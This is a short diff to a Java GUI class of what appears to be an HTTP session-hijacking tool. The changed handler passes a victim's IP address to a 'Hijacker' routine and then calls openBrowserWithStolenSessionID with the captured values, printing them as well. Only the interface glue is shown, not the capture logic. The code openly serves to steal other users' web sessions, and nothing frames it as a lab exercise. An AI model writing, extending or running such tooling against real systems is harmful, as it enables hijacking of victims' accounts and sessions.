@@ -5,6 +5,7 @@ import java.awt.event.ActionListener;
 import java.awt.event.WindowEvent;
 import java.awt.event.WindowListener;
 import java.net.*;
+import java.util.Arrays;
 
 public class GUI extends Frame implements WindowListener, ActionListener {
     private JPanel p1;
@@ -121,7 +122,15 @@ public class GUI extends Frame implements WindowListener, ActionListener {
         Integer chosenTimeout = (Integer) searchTimeoutChoice.getSelectedItem();
         String[] ans = HTTPHijack.Hijacker(victimIPString, chosenTimeout);
 
-        System.out.println(ans[0]);
-        System.out.println(ans[1]);
+        if (Arrays.asList(ans).contains(null)) {
+            timeoutReached();
+        } else {
+            openBrowserWithStolenSessionID(ans[0], ans[1], ans[2]);
+            System.out.println(ans[0]);
+            System.out.println(ans[1]);
+            System.out.println(ans[2]);
+        }
+
+
     }
 }
